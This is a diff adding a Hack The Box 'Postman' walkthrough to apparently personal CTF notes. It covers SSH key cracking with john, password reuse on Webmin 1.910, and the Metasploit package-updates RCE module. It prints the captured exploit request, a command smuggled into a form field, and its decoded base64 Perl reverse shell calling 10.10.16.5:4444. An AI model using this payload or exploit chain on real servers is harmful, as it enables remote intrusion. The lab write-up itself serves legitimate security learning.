@@ -254,3 +254,46 @@ Frolic.HTB
 =======================================================================================================================
 
 To capture the root flag on this box, you will need to play with ROP Buffer Overflow. Also, BrainFuck and OOK!
+
+
+Postman.HTB
+=======================================================================================================================
+while solving this box I used the ssh2john.
+This box had id_rsa.bak file which i was able to pullout after running the LinEnum.sh and then I downloaded it from the box using nc to my kali and use ssh2josh id_rsa.bak > id_rsa.john 
+Following to that I used john --wordlist=rockyou.txt id_rsa.john to crack the SSH key password. The user Matt was using this password and I got user flag.
+
+To capture the root flag, I looked at the WebMin. Version 1.910 was running. 
+10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
+
+Upon accessing http://postman.htb:10000/ i found a login page of WebMin where I used Matt as a username and 'computer2008' as a password. This is exactly the same password I got when I cracked the SSH key above using rockyou.txt. Following to that I found a MetaSploit Module.
+
+use exploit/linux/http/webmin_packageup_rce
+set RHOST 10.10.10.160
+set SSL true
+set USERNAME Matt
+set PASSWORD computer2008
+set Proxies http:127.0.0.1:8000
+set ReverseAllowProxy true
+Exploit
+
+
+This will pass all my requests to the box through the Burp. Here's the payload i notice in the Burp
+
+POST /package-updates/update.cgi HTTP/1.1
+Host: 10.10.10.160:10000
+User-Agent: Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1
+Cookie: sid=419fbc471e5dfa52d39ef84a8bcd21e6
+Referer: https://10.10.10.160:10000/package-updates/?xnavigation=1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 440
+Connection: close
+
+u=acl%2Fapt&u=%20%7C%20bash%20-c%20%22%7becho%2ccGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNi41OjQ0NDQiKTtTVERJTi0%2bZmRvcGVuKCRjLHIpOyR%2bLT5mZG9wZW4oJGMsdyk7d2hpbGUoPD4pe2lmKCRfPX4gLyguKikvKXtzeXN0ZW0gJDE7fX07Jw%3d%3d%7d%7c%7bbase64%2c-d%7d%7c%7bbash%2c-i%7d%22&ok_top=Update+Selected+Packages
+
+Upon Decoding the payload i got the following string.
+ | bash -c "{echo,cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNi41OjQ0NDQiKTtTVERJTi0+ZmRvcGVuKCRjLHIpOyR+LT5mZG9wZW4oJGMsdyk7d2hpbGUoPD4pe2lmKCRfPX4gLyguKikvKXtzeXN0ZW0gJDE7fX07Jw==}|{base64,-d}|{bash,-i}"
+
+ Notice that Echo String with Base64, Here's the decoded version of it.
+ perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.10.16.5:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
+
+ So basically the Perl Shell was encoded as Base64 following to that it was placed within echo and encoded again in the final request.
